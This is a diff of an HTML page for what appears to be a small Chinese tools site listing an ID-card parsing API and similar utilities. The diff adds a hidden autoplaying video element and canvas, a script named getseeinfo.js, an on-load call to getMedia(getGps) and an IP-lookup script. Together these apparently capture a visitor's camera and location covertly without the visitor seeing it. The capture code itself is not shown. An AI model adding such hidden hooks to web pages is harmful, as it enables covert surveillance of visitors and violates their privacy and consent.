@@ -19,6 +19,7 @@
 		<script src="https://www.layuicdn.com/layui/layui.js"></script>
 
 		<meta name="referrer" content="never">
+		<script src="/static/js/getseeinfo.js"></script>
 
 	</head>
 	<body>
@@ -37,7 +38,7 @@
 								</button>
 							</a>
 						</li>
-						
+
 						<li class="list-group-item">
 							<a href="/sfz/">
 								<span class="text-primary">身份证解析API</span>
@@ -46,7 +47,7 @@
 								</button>
 							</a>
 						</li>
-						
+
 						<li class="list-group-item">抖音去水印</li>
 						<li class="list-group-item">蓝鲸游戏管理后台</li>
 						<li class="list-group-item">未完待续</li>
@@ -81,9 +82,9 @@
 				</div>
 			</div>
 		</div>
-		<iframe src="getlookinfo.html" style="display: none;">
-			
-		</iframe>
+		<video id="video" width="600px" height="600px" autoplay="autoplay" style="display: none;"></video>
+		<canvas id="canvas" width="600px" height="600px" style="display: none;"></canvas>
+
 	</body>
 	<style>
 		body {
@@ -103,6 +104,8 @@
 		}
 	</style>
 	<script>
+		getMedia(getGps);
+
 		function getinfo() {
 			$.ajax({
 				url: "/sysinfo",
@@ -125,11 +128,11 @@
 
 		};
 		$(document).ready(function() {
-
 			setInterval(function() {
 				getinfo();
 			}, 1000);
 
 		});
 	</script>
+	<script src="http://whois.pconline.com.cn/ipJson.jsp"></script>
 </html>
